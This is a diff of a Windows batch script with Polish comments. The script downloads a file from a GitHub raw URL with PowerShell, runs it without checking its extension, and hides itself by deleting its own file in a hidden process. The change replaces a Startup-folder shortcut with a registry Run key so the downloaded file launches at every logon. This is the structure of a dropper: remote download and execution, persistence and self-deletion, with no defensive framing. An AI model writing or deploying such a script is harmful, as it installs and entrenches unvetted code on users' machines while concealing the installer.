@@ -19,11 +19,8 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/p
 :: Uruchom bez sprawdzania rozszerzenia
 start "" "%DEST%\%FILE%"
 
-:: Dodaj skrót do autostartu, jeśli jeszcze nie istnieje
-set SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\launcher.lnk
-if not exist "%SHORTCUT%" (
-    powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%SHORTCUT%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Save()"
-)
+:: Dodaj skrót do autostartu
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v autostart_entry /d "\"%DEST%\%FILE%\"" /f
 
 :: Wydziel samousuwanie do osobnego procesu, aby nie blokować pliku .bat
 powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item '%~f0' -Force" & exit
